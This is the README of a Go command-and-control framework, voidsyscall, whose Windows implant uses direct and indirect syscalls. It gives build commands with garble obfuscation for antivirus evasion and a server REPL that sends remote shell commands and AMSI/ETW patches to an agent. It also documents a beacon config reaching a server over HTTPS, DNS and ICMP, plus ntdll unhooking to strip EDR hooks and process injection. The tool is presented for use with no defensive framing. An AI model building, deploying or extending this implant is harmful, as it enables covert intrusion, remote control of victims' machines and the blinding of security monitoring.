# voidsyscall

[![go](https://img.shields.io/badge/go-1.24-00ADD8?logo=go&logoColor=white)](https://go.dev)
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-lightgrey?logo=linux)](#build)
[![c2 channels](https://img.shields.io/badge/c2-https%20%7C%20dns%20%7C%20icmp-blueviolet)](channels/)
[![syscall only](https://img.shields.io/badge/implant-syscall%20only-critical?logo=intel)](syscallwin/)

Zero WinAPI. Every NT primitive resolved at runtime from ntdll in memory —
`SYSCALL` instructions issued directly via Plan9 assembly stubs, no import table,
no ntdll usermode hooks touched. C2 over HTTPS / DNS / ICMP, AES-256-GCM on
every message. Windows-native. Linux builds. macOS builds. The syscall library
cross-compiles. The beacon agent is Windows because that's where the fun is.

This is not a syscall wrapper. It is a syscall _library_ that resolves its own
SSN from the current ntdll image, hashes every function name (djb2, never
plaintext in the binary), caches syscall numbers in a runtime map, and hands you
~25 `Nt*` wrappers that go straight through `syscall` on x86-64. If your EDR
hooks ntdll usermode, that's your problem. This repo doesn't care.

---

## What's inside

| | |
|---|---|
| **SSN resolution** | PEB→LDR walk, djb2 hash, export table scan, prologue match for `B8 xx xx 00 00 0F 05` |
| **Direct syscall** | Plan9 asm stub, SSN + 7 args set by hand, `SYSCALL` instruction, return via `RAX`/`RDX` |
| **Indirect syscall** | `syscall; ret` gadget located inside ntdll, `CALL` lands in ntdll memory, call stack reads ntdll |
| **Unhook** | `.text` restored from disk copy, `NtFlushInstructionCache`, SSN cache nuked |
| **Evasion** | AMSI `AmsiScanBuffer` → `MOV EAX, 0; RET`, ETW `EtwEventWrite`/`NtTraceEvent` patched, `DbgUiRemoteBreakin` → `RET`, instrumentation callbacks masked |
| **Injection** | `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory` → `NtCreateThreadEx`, variant APC via `NtQueueApcThread` |
| **Transport** | HTTPS POST, DNS TXT chunked subdomains, ICMPv4 echo payload — `Channel` interface, priority fallback |
| **Crypto** | AES-256-GCM per-message AEAD, unique nonce, per-implant keyring |
| **Beacon** | `sleep + rand[jitter_min..jitter_max]`, clean exit, no persistence v1 |

---

## Layout

```
voidsyscall/
  cmd/
    server/          listeners (HTTPS/DNS/ICMP), interactive REPL, task queue
    agent/           beacon loop + task dispatch [windows]
  syscallwin/        direct/indirect NT syscalls [windows] — Go + asm_amd64.s
    asm_amd64.s      Syscall / IndirectSyscall / ReadGSBase / SetGSBase
    resolve.go       GetModuleBase (PEB walk), PE export parse, resolveSSN, findSyscallGadget
    stubs.go         ~25 Nt* wrappers, DirectSyscall, IndirectSyscallByHash, GetCurrentProcessId
    hash.go          djb2 hash (string + UTF-16 pointer variant)
    constants.go     MEM_*, PAGE_*, THREAD_*, TOKEN_*, OBJ_*, REG_*, FILE_*, NTSTATUS
    unhook.go        UnhookNtdll (disk restore + flush), SelfDel (remote thread)
  syscallnix/        mmap / mprotect / munmap / raw read+write+exit [linux, darwin]
  patches/           AMSI, ETW, NtTraceEvent, DbgUiRemoteBreakin, InstrumentationCallback [windows]
  loader/            injection: CreateThread, APC, module-stomp stub [windows]
  channels/          Channel interface, HTTP, DNS (TXT), ICMP (x/net/icmp)
  crypto/            AES-GCM encrypt/decrypt, envelope, passphrase variant
  server/            SessionManager, Task Queue, Result store
  agent/             Config loader, beacon, task handlers (shell/inject/patch/sleep/exit)
  agent/example-config.json
```

---

## Build

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-agent.exe   ./cmd/agent
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o voidsyscall-server.exe  ./cmd/server
GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -o server-linux            ./cmd/server
GOOS=darwin  GOARCH=arm64 go build -ldflags="-s -w" -o server-darwin           ./cmd/server
```

Obfuscation with [garble](https://github.com/burrowers/garble) (`go install mvdan.cc/garble@latest`):

```bash
GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags="-s -w" \
    -o voidsyscall-agent.exe ./cmd/agent
```

Build helpers: `build.ps1` (PowerShell), `Makefile` (`make all` / `make obfuscate` / `make vet` / `make test`).

> garble builds will be flagged by Windows Defender (or any AV) at link time —
> the output binary is temporarily mapped RWX during linking. This is expected
> behavior and will resolve with `ldflags` strip or external loader if you need
> clean-host builds.

---

## Usage

### Server

```bash
# generate a self-signed cert (don't ship this to prod, you animal)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# run
./voidsyscall-server.exe --cert cert.pem --key key.pem --https-port 443
```

REPL:

```
voidsyscall> sessions
  [a1b2c3d4e5f60718] channel=https last=2024-01-01T00:00:00Z tasks=0 results=0

voidsyscall> shell a1b2c3d4e5f60718 whoami
Task queued

voidsyscall> patch a1b2c3d4e5f60718 amsi
Patch task queued

voidsyscall> patch a1b2c3d4e5f60718 etw
Patch task queued

voidsyscall> exit
```

### Agent

```bash
./voidsyscall-agent.exe -c agent/example-config.json
```

```json
{
  "id":          "0102030405060708090a0b0c0d0e0f10",
  "key":         "0000000000000000000000000000000000000000000000000000000000000000",
  "channels":    ["https", "dns", "icmp"],
  "server":      "10.0.0.1",
  "path":        "/api/v2/health",
  "jitter_min":  5,
  "jitter_max":  30,
  "sleep":       30,
  "ua":          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
```

Fallback order: `https` → `dns` → `icmp`. Beacon interval is
`sleep + rand[jitter_min..jitter_max]` seconds.

---

## How it works: SSN resolution

Every Windows build ships a new ntdll with different syscall numbers. Static
number tables break the first patch Tuesday. This library resolves the number
at runtime from the current ntdll image in memory:

1. `ReadGSBase` (asm) reads `GS:[0x60]` → **TEB**.
2. TEB+0x60 → **PEB**. PEB+0x18 → `Ldr` (PEB_LDR_DATA).
3. Walk `InMemoryOrderModuleList` → match `ntdll.dll` base address via `djb2` hash of the name.
4. From the base: `IMAGE_DOS_HEADER` → `e_lfanew` → `IMAGE_NT_HEADERS` → `OptionalHeader` → DataDirectory[0] = **Export Table**.
5. Walk `AddressOfNames[]`, hash each with djb2, match against the target function hash.
6. Resolve ordinal → `AddressOfFunctions[ordinal]` → function address.
7. Scan the function prologue for `B8 ww xx 00 00 0F 05` (direct), `B8 xx xx 00 00 C3` (early-ret), or `4C 8B D1 B8 xx xx 00 00 0F 05` (Hells Gate).
8. Extract the two-byte SSN, store in `map[uint32]uint16` cache.

Result: no function names appear in the binary (only djb2 hashes), and the
`syscall` instruction bypasses every usermode hook on ntdll.

### Indirect syscalls

`IndirectSyscallByHash` locates a `0F 05 C3` gadget (`syscall; ret`) anywhere
inside ntdll, loads the SSN into `EAX`, and executes `CALL R10` (the gadget
address). The CPU trap lands inside ntdll — the return address on the stack
points back into ntdll, not into the implant. No inline hook survives this
because the call never originates from usermemory.

### Unhook

`UnhookNtdll`: lock `.text` to `PAGE_EXECUTE_READWRITE` via
`NtProtectVirtualMemory`, copy the original bytes from the disk-mapped ntdll
image, restore the original protection, flush the instruction cache, nuke the
SSN cache. Every usermode hook placed on ntdll by any EDR is gone.

---

## Channels

| Channel | Wire format | Prereqs | Notes |
|---------|-------------|---------|-------|
| **HTTPS** | binary POST to `/api/v2/health`, custom framing, randomized UA/path | TLS cert on server | default fallback |
| **DNS** | `<idx>-<total>-<base32 payload>` as subdomain, TXT record response | DNS resolution on host | chunked for large payloads |
| **ICMPv4** | payload embedded in echo request/reply ID+seq fields | raw socket (root/Admin) | best-effort, Windows kernel validates return address |

All channels implement the `Channel` interface:

```go
type Channel interface {
    Type() ChannelType
    Send(ctx context.Context, msg *Message) (*Message, error)
    Listen(ctx context.Context, addr string, handler func(*Message) *Message) error
    Close() error
}
```

The implant has zero knowledge of transport. It sees `Message{ID, Type, Data}`.
Adding a new channel (NTP, TURN, DoH) = implementing the interface, zero changes
to the agent.

---

## Low-level API

`syscallwin` (build tag `windows`) exposes wrappers that call **only** via
syscall — no winapi, no cgo, no syscall package:

```
NtAllocateVirtualMemory    NtProtectVirtualMemory     NtFreeVirtualMemory
NtReadVirtualMemory        NtWriteVirtualMemory        NtFlushInstructionCache
NtCreateThreadEx           NtOpenProcess               NtOpenThread
NtSuspendProcess           NtResumeProcess             NtTerminateProcess
NtClose                    NtDuplicateObject           NtOpenProcessToken
NtQueryInformationToken    NtAdjustPrivilegesToken     NtSetInformationThread
NtCreateKey                NtSetValueKey               NtCreateFile
NtQuerySystemInformation   NtCreateSection             NtMapViewOfSection
NtQueryVirtualMemory       NtQueueApcThread
```

Generic entry points for custom stubs:

```go
DirectSyscall(funcName string, args ...uintptr) (uintptr, error)
IndirectSyscallByHash(funcHash uint32, args ...uintptr) (uintptr, error)
```

`patches` exposes: `PatchAMSI`, `PatchETW`, `PatchNtTraceEvent`,
`PatchDbgUiRemoteBreakin`, `PatchInstrumentationCallbacks`,
`ApplyAllPatches`, `ApplyCriticalPatches`.

`crypto` exposes: `Encrypt(key, plaintext)`, `Decrypt(key, env)`,
`EncryptWithPassphrase`, `DecryptWithPassphrase` — AES-256-GCM with 12-byte
nonce, all round-trip tested.

---

## Status

Shipped: beacon loop, task queue, HTTPS/DNS/ICMP channels, CreateThread + APC
injection, AMSI/ETW patching, AES-GCM crypto, session management, interactive
server REPL. Tests pass.

Not yet: persistence, staged loader, session key rotation, autonomous Linux
implant (builds exist, no agent logic), NTP/DoH channels.

## Acknowledgments

- [carved4/go-native-syscall](https://github.com/carved4/go-native-syscall) — the reference for direct+indirect Go syscalls
- [Enelg52/OffensiveGo](https://github.com/Enelg52/OffensiveGo) — Go red team tooling, Plan9 asm patterns, garble flags
- [am0nsec/HellsGate](https://github.com/am0nsec/HellsGate) — SSN resolution from the function prologue
- [f1zm0/acheron](https://github.com/f1zm0/acheron) — indirect syscalls in Go assembly
- [Sliver C2](https://github.com/BishopFox/sliver) — architecture reference for cross-platform C2

## License

MIT — [LICENSE](LICENSE)